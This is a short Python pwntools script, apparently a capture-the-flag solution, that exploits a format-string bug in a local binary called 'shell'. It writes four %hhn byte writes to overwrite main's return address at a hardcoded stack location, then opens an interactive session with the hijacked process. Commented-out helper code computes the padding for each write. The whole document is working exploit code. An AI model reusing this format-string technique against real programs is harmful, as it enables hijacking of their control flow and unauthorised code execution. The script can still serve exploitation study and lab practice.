#!/usr/bin/python 
from pwn import *
# context.log_level = 'debug'

# def getPadd(write_byte,already_written):
#     write_byte += 0x100
#     already_written %= 0x100
#     padding = (write_byte - already_written) % 0x100
#     if padding < 10:
#         padding += 0x100
#     return padding

# write_byte = [0xcd, 0x84, 0x04, 0x08]
# written = 16
# for i in range(len(write_byte)):
#     paddLen=getPadd(write_byte[i],written)
#     written+=paddLen
#     print '%'+str(paddLen)+'x'

ret = 0xffffcfac #pointer to the return address of main (moveable) on stack
p = process('shell')

payload =  p32(ret+0) + p32(ret+1) + p32(ret+2) + p32(ret+3) 
payload += "%0189x" + "%7$hhn" + "%0183x" + "%8$hhn" 
payload += "%0128x" + "%9$hhn" + "%0260x" + "%10$hhn"
# payload = "%s" * 12
# f = open('f','w')
# f.write(payload)
# f.close()

p.sendline(payload)

p.interactive()
